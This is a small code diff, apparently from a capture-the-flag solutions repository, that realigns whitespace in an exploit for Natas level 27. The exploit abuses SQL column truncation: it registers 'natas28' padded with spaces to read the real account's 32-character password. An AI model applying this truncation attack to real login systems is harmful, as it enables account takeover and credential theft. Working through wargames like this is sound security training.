@@ -8,11 +8,10 @@ class Level_27(NatasLevel):
 
   def exploit(self) -> str:
 
-    USER = "natas28" + " " * 57 + "x"
+    USER       = "natas28" + " " * 57 + "x"
     USER_LOGIN = "natas28" + " " * 57
-
     self.session.post(self.base_url, data = {"username": USER, "password": "hola"})
-    resp  = self.session.post(self.base_url, data = {"username": USER_LOGIN, "password": "hola"})
-    match = re.search(r'\[password\] =&gt; ([a-zA-Z0-9]{32})', resp.text).group(1)
+    resp       = self.session.post(self.base_url, data = {"username": USER_LOGIN, "password": "hola"})
+    match      = re.search(r'\[password\] =&gt; ([a-zA-Z0-9]{32})', resp.text).group(1)
 
     return match
